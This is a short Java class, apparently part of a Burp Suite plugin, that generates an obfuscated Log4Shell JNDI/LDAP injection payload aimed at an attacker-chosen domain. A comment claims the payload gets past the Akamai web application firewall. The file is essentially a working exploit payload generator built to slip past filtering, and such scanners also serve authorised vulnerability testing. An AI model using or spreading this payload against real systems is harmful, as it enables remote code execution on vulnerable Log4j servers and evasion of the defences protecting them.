package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

//Currently bypass Akamai waf?    12/18

public class POC15 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${jndi${123%25ff:-}:ldap://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_LDAP;
    }

    @Override
    public int getIndex() {
        return 15;
    }
}
